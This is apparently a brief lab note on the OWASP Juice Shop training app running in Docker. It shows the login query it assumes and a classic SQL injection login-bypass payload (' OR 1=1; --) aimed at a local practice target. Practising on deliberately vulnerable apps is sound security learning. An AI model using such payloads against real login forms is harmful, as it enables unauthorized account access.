# Environment: docker pull bkimminich/juice-shop

# Target
# http://localhost/#/login

# Original Query
SELECT * FROM Users WHERE email = '' AND password = ''

# SQL Injection
'OR 1=1; -- 